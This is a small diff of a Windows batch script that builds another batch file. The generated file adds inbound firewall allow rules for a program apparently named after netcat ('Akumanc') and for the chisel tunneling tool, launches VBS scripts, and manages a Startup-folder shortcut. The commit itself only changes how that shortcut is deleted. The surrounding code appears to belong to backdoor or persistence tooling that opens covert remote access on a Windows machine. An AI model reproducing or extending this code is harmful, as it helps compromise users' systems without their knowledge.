@@ -17,8 +17,7 @@ echo powershell New-NetFirewallRule -DisplayName "Akumanc" -Direction Inbound -P
 echo powershell Remove-NetFirewallRule -Name "Akumachisel" >> %userprofile%\Akuma\beyondbirthday.bat
 echo powershell New-NetFirewallRule -DisplayName "Akumachisel" -Direction Inbound -Program "%userprofile%\Akuma\chisel.exe" -Action Allow >> %userprofile%\Akuma\beyondbirthday.bat
 echo start %userprofile%\Akuma\死神.vbs >> %userprofile%\Akuma\beyondbirthday.bat
-echo cd "%userprofile%\Microsoft\Windows\Start Menu\Programs\Startup" >> %userprofile%\Akuma\beyondbirthday.bat
-echo del "beyondbirthday.lnk" >> %userprofile%\Akuma\beyondbirthday.bat
+echo del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\beyondbirthday.lnk" >> %userprofile%\Akuma\beyondbirthday.bat
 set "vbsFilePath=%userprofile%\Akuma\beyondbirthday.vbs"
 IF EXIST "%vbsFilePath%" (
     cscript "%vbsFilePath%"
